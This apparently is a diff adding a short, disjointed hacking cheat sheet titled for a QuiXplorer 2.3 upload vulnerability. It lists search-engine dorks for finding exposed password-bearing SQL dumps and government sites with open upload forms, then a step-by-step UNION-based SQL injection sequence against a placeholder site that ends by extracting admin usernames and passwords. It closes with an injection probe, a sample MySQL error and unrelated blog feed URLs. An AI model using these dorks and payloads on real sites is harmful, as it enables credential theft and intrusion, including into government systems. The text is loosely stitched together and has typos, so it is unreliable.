@@ -1,0 +1,47 @@
+QuiXplorer 2.3 Upload Vulnerability
+
+Dork: 
+intitle:”QuiXplorer 2.3 – the QuiX project”
+filetype:sql “phpmyAdmin SQL Dump” (pass|password|­passwd|pwd) 
+filetype:sql “phpmyAdmin SQL Dump” wp_users (pass|password|­passwd|pwd)
+
+Exploit:
+atom.xml?redirect=false&start-index=1&max-results=500
+http://%5Btarget%5D/%5Bpath%5D/index.php?action=list&order=name&srt=yes
+
+Dumping data for table `wp_users'
+Dumping data for table `users`
+
+http://www.target.com/berita.php?id=100+order+by+1/*
+http://www.target.com/news.php?id=100+union+select+1,2,3,4,5,6,7,8,9/*
+http://www.target.com/news.php?id=100+union+select+1,2,version(),4,5,6,7,8,9/*
+http://www.target.com/news.php?id=100+union+select+1,2,@@version,4,5,6,7,8,9/*
+http://www.target.com/berita.php?id=100+union+select+1,2,table_name,4,5,6,7,8,9+from+information_schema.tables/*
+http://www.target.com/berita.php?id=100+union+select+1,2,column_name,4,5,6,7,8,9+from+information_schema.colums/*
+http://www.target.com/news.php?id=100+union+select+1,username,3,4,5,6,7,8,9+from+admin/*
+http://www.target.com/news.php?id=100+union+select+1,password,3,4,5,6,7,8,9+from+admin/*
+
+Dork :
+ Allowed file types: png gif jpg txt. site:go,id
+ Allowed file types: png gif jpg txt. site:go.th
+ Allowed file types: png gif jpg txt. site:gov
+ 
+inurl:.”domain”/”dorks”
+
+“inurl” = input URL
+“domain” = .gov
+“dorks” = dork 
+
+inurl:.gov/index.php?id=(‘)
+http://www.target.com/category.php?id=5‘
+
+error:
+
+” Error executing query: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘\\\’ ORDER BY date_added DESC’ at line 1 
+
+https://george-74.blogspot.com/atom.xml?redirect=false&start-index=1&max-results=500
+https://george-74.blogspot.com/sitemap.xml
+https://george-74.blogspot.com/robots.txt
+http://anyblog.blogspot.com/atom.xml?redirect=false&start-index=1&max-results=500
+https://yourblog.blogspot.com/atom.xml?redirect=false&start-index=151&max-results=300
+http://www.alexa.com/data/details/main?url=https://infohackomputer.wordpress.com
